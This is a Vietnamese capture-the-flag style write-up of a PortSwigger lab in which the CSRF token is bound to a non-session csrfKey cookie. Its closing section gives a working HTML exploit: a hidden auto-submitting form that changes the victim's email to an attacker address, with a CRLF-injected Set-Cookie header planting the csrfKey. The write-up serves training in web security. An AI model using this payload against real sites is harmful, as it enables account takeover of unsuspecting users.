![[Pasted image 20260928121241.png]]

- [ ]  Khai thác lỗ hổng CSRF để thay đổi địa chỉ email của victim
- [ ]  Chức năng đổi email dính lỗi CSRF.
- [ ] Server có sử dụng CSRF token để phòng vệ.
- [ ] Lỗi logic: Token được gắn với một cookie không phải session (thường là csrfKey), nhưng cookie này không được tích hợp chặt chẽ vào hệ thống quản lý session.

- [ ]  Sử dụng Exploit Server của PortSwigger để host trang HTML chứa payload.
- [ ] Tài khoản 1 (để test/lấy token): wiener:peter
- [ ] Tài khoản 2 (mục tiêu/nạn nhân): carlos:montoya

# 1-Phân tích
![[Pasted image 20260928210220.png]]
- [ ] ban đầu như trên ảnh, khi ta xem chức năng đổi email, thì trong cookie có 2 trường là csrf-key và session
	=> hai thằng này được đính kèm vào request [1]
![[Pasted image 20260928210415.png]] => ta sẽ inspect nút upload để xem csrf token-> có thể thấy mỗi lần restart thì cái csrf token này ko đổi [2]
=> ta ngầm hiểu rằng nó sẽ sử dụng csrf-token và csrf-key với mục đích xác thực nguồn gốc của request có đến từ user thật hay ko
![[Pasted image 20260928210620.png]]
=> tiếp theo ta sẽ soi tiếp cái thằng change-email này
-> có thể thấy trình duyệt gửi cặp csrfkey-và csrf-token, để xác thực nguồn gốc request [3]
-sau đó ta thử logout ra, để xem liệu csrf token có thay đổi ko-> thì như ảnh bên dưới, csrf token vẫn như thến [4]
![[Pasted image 20260928210907.png]]

Từ [1], [2], [3]; <u>ta có các dữ kiện sau</u> [5]
- [ ] csrf-token ko đổi; bất kể  cho dù log out , hay change email bao nhiêu lần
- [ ] csrf-key ko đổi
- [ ] session, csrf-key, csrf-token dùng để xác thực request
==> câu hỏi đặt ra là liệu bọn này dùng cả 3 yếu tố trên xác thực hay sao? hay là có cơ chế xác thực chưa chặt?

-Tiếp tục ta đăng nhập  tài khoản `carrlos` trên 1 trình duyệt khác , sau đó thử thay cặp csrf-key ; csrf token của `wwreiner` vô
![[Pasted image 20260928211402.png]]
=> có thể thấy change được email
==> <u>ta suy luận ra được chỉ cần cặp csrf-token , csrf-key mà khớp; thì cho dù là `seession` của 1 user khác đi nữa, thì vẫn có thể fake được request, khiến server tin rằng request này được gửi từ user </u>[6]

# 2-khai thác
-Từ [5] và [6] suy ra được exploit website dưới đây.Đại khái là click vào cái trang web này, nó sẽ gửi request tới change email ,email thay bằng email của hacker; và quan trọng nhất nó đính kèm cặp csrf key và token hợp lệ ==> bypass bước xác minh tính tin cậy của request ==> csrf

```html
<html>
  <body>
    <form action="https://0a3500bf037f275381d1a23500d50006.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="csrf" value="X6GO0qknLAgmYAnSgwgZrWg7IM6RWYfJ">
    </form>
    <img src="https://0a3500bf037f275381d1a23500d50006.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=eJLePkvohtqmHLqooczXryCaxv2bQOOb%3b%20SameSite=None" onerror="document.forms[0].submit();">
  </body>
</html>
```

![[Pasted image 20260928210129.png]]